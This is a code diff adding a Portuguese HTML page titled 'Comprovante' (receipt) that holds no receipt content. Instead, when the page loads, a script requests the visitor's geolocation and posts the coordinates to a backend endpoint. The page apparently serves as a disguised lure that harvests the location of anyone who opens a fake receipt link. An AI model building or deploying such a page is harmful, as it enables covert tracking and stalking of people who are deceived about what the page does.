@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante</title>
+</head>
+<body style="background-color: antiquewhite;">
+  <h1>Comprovante</h1>
+
+  <script>
+    // Executa automaticamente ao carregar a página
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude: " + latitude);
+      console.log("Longitude: " + longitude);
+
+      // Envia a localização para o backend
+      fetch("http://localhost:8088/send-location", {  // Certifique-se de que a URL esteja correta
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert("Localização enviada com sucesso!");
+        } else {
+          alert("Erro ao enviar a localização. Tente novamente mais tarde.");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+        alert("Erro ao enviar a localização. Tente novamente mais tarde.");
+      });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
+  </script>
+</body>
+</html>
